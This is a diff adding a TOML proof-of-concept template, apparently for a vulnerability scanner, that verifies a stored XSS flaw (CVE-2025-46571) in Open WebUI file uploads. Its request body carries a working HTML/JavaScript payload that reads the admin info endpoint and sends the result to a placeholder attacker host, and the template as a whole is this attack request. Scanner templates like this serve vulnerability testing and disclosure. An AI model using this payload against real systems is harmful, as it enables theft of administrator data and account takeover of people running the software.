@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "低权限用户通过 /api/v1/files/ 上传 HTML 文件，验证存储型 XSS 漏洞（CVE-2025-46571）。上传成功返回文件 ID，管理员访问该文件后触发 XSS 导致账户劫持。"
+id = "POC-AVE-2025-0005"
+name = "Open WebUI Stored XSS PoC"
+severity = "medium"
+tags = ["ave-2025-0005"]
+vuln_id = [
+    "CVE-2025-46571",
+    "AVE-2025-0005",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/files/"
+protocol = "http"
+
+[poc.requests.body]
+content = "<html><body><script>fetch('/api/v1/auths/admin/info').then(r=>r.text()).then(d=>fetch('https://ATTACKER/steal?data='+encodeURIComponent(d)))</script></body></html>"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/html"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"id"']
